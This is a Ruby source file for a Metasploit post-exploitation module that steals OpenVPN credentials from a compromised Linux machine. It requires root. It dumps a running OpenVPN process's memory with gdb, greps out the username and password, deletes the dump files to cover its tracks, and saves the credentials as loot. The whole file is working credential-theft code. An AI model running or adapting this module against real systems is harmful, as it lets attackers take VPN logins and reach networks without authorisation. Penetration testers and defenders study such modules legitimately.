##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'OpenVPN Gather Credentials',
      'Description'   => %q{
        This module grab OpenVPN credentials from a running process
        in Linux.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'rvrsh3ll', # Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit Module
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => [
        ['URL', 'https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh']
      ]
    ))

    register_options(
      [
        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.'])
      ], self.class
    )
  end

  def pid
    datastore['PID']
  end

  def run
    user = cmd_exec('/usr/bin/whoami')
    print_good("Module running as \"#{user}\" user")

    unless is_root? && user == 'root'
      print_error('This module requires root permissions.')
      return
    end

    cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done')
    strings = cmd_exec('/usr/bin/strings *.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk \'{print "User: "$1"\nPass: "$2}\'')
    cmd_exec('/bin/rm *.dump --force')

    if strings.empty?
      print_error('No credentials. You can check if the PID is correct.')
      return
    end

    vprint_good("OpenVPN Credentials:\n#{strings}")

    p = store_loot(
      'openvpn.grab',
      'text/plain',
      session,
      strings,
      nil
    )
    print_status("OpenVPN Credentials stored in #{p}")
  end
end
